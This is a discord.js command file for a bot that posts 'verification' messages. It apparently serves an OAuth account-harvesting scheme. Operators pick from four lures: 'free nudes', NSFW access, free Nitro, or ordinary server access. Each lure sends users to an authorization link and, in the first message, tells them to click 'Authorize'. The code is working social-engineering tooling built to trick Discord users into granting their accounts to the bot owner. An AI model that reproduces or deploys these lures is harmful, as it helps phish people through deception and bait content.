const { EmbedBuilder, ActionRowBuilder, StringSelectMenuBuilder, ButtonBuilder, ComponentType, ButtonStyle } = require("discord.js");
const { SlashCommandBuilder } = require("@discordjs/builders");
const config = require('../Settings/config')
const botSchema = require('../Schema/botSchema');

module.exports = {
  data: new SlashCommandBuilder()
    .setName("verify")
    .setNameLocalizations({tr: "dogrulama", fr: "verifier"})
    .setDescription("Verification messages")
    .setDescriptionLocalizations({tr: "Doğrulama mesajları!", fr: "Messages de vérification!"}),
    enabled: true,
    async execute(interaction, client) {

      const embed = new EmbedBuilder()
      .setDescription(interaction.locale == "tr" ? "Bu komutu kullanmak için 'bot sahibi' veya 'beyaz listede' ekli olmanız gerekir." : interaction.locale == "fr" ? "Pour utiliser cette commande, vous devez être attaché au 'propriétaire du bot' ou à la 'liste blanche'." : "To use this command, you need to be attached to the 'bot owner' or 'whitelist'.")
      .setTitle(interaction.locale == "tr" ? "❌ Erişim reddetildi" : interaction.locale == "fr" ? "❌ Acces refuse" : "❌ Access denied")
      let btn = new ButtonBuilder()
      .setStyle(5)
      .setURL(client.authInvite)
      .setLabel("Add bot")
      .setEmoji("🤖");
      let btn2 = new ButtonBuilder()
      .setStyle(5)
      .setURL(config.client.serverLink)
      .setLabel("Join support")
      .setEmoji("❓");
      const row31 = new ActionRowBuilder() 
      .addComponents([btn, btn2]);

      let data = await botSchema.findOne({ clientId: client.user.id })
      let whitelist = data.whitelist.find(x => x.id === interaction.user.id)
      if(!config.authDevelopers.includes(interaction.user.id) && !config.authOwners.includes(interaction.user.id) && whitelist?.id !== interaction.user.id) return interaction.reply({ ephemeral: true, embeds: [embed], components: [row31]})
  
      const row = new ActionRowBuilder()
    .addComponents(

      new StringSelectMenuBuilder()
      .setCustomId("menu12")
      .setPlaceholder(interaction.locale == "tr" ? "🔨 Bir seçenek seçin" : interaction.locale == "fr" ? "🔨 Sélectionnez une option" : "🔨 Select an option")
      .addOptions(
        {
          label: "Nude Verify",
          value: "nude"
        },
        {
          label: "NSFW Verify",
          value: "nsfw"
        },
        {
          label: "Nitro Verify",
          value: "nitro"
        },
        {
          label: "Normal Verify",
          value: "normal"
        },
      )

    )

    let msg = await interaction.reply({ ephemeral: true, components: [row] })

    let collector = msg.createMessageComponentCollector({ time: 30 * 1000, componentType: ComponentType.SelectMenu})
    collector.on('collect', async (button) => {
      
      if(button.values[0] === "nude") {
        let btn = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setURL(client.authLink)
        .setLabel("Verify");
        const row = new ActionRowBuilder() 
        .addComponents([btn]);
        button.channel.send({ content: `
Hello, you want free nudes? 👀 Follow the steps!
・First click Verify button!
・Second click Authorize
Now you are ready! 👅`, components: [row]});
      }
      if(button.values[0] === "nsfw") {
        let embed = new EmbedBuilder()
        .setTitle("Verify in " + button.guild.name)
        .setColor('2F3136')
        .setDescription(`Click **Button** for access our **NSFW** content`)
        .setImage("https://cdn.discordapp.com/attachments/1042718681781764116/1043211765086957588/Astrid_Banner_64872118.jpg")
        let btn = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setURL(client.authLink)
        .setLabel("Verify");
        const row = new ActionRowBuilder() 
        .addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row]})
      }
      if(button.values[0] === "nitro") {
        let embed = new EmbedBuilder()
        .setTitle("Verify in " + button.guild.name)
        .setDescription(`
Hello, you need to Verify Your Account to Claim Your Nitro !
Verify Your Self By [Click here to Verify!](${client.authLink})`)
        .setColor('2F3136')
        .setImage("https://media.discordapp.net/attachments/991938111217094708/992945246138794044/Nitro.png")
        let btn = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setURL(client.authLink)
        .setLabel("Verify");
        const row = new ActionRowBuilder() 
        .addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row]})
      }
      if(button.values[0] === "normal") {
        let embed = new EmbedBuilder()
        .setTitle("Verify in " + button.guild.name)
        .setDescription(`To get **access** to the rest of the server, click on the **verify** button.`)
        .setColor('2F3136')
        let btn = new ButtonBuilder()
        .setStyle(ButtonStyle.Link)
        .setURL(client.authLink)
        .setLabel("Verify");
        const row = new ActionRowBuilder() 
        .addComponents([btn]);
        button.channel.send({ embeds: [embed], components: [row]})
      }

    })

    }
 };